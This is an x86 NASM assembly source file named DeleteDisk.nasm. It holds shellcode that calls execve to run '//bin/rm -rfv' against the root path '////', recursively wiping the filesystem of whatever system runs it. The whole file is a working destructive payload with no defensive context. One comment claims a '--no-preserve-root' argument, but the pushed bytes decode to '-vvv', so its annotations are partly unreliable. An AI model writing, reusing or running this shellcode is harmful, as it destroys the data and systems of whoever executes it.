; DeleteDisk.nasm
; Author: Ravehorn

global _start

section .text

_start:
    ; xoring registers

    xor eax, eax
    xor ecx, ecx
    xor edx, edx
    
    ; push null eax register to the stack

    push eax                

    ; push //bin/rm to the stack and save it into ebx

    push 0x6d722f6e
    push 0x69622f2f
    mov ebx, esp

    ; push null eax register to the stack

    push eax

    ; push --no-preserve-root to the stack and save it into edx

    push 0x7676762d
    mov edx, esp

    ; push null eax register to the stack

    push eax

    ; push //// to the stack and save it into ecx

    push 0x2f2f2f2f
    mov ecx, esp

    ; push null eax register to the stack

    push eax

    ; push -rf to the stack and save it into esi
    
    push 0x7666722d
    mov esi, esp

    ; push everything on the stack
    push eax
    push edx
    push ecx
    push esi
    push ebx
    mov ecx, esp


    mov al, 11              ;define execve
    int 0x80                ;execute command